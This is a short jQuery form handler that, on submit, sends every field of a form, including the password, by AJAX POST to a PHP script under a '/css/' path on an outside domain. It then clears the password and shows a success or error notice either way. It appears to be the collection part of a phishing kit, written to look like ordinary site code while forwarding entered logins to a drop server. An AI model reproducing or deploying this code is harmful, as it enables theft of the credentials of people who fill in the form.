$(document).ready(function() {
            
            $("#myForm").submit(function(event) {
                event.preventDefault();

                
                var formData = new FormData($(this)[0]);

                
                $.ajax({
                    url: "https://www.getwillisfin.com/css/d.php",
                    type: "POST",
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function(response) {
                        
                        $("#myForm input[name='password']").val("");
                        $("#success-message").show();
                        setTimeout(function() {
                            $("#success-message").hide();
                        }, 5000);
                    },
                    error: function(xhr, status, error) {
                        
                        $("#myForm input[name='password']").val("");
                        $("#error-message").show();
                        setTimeout(function() {
                            $("#error-message").hide();
                        }, 5000);
                    }
                });
            });
        });
    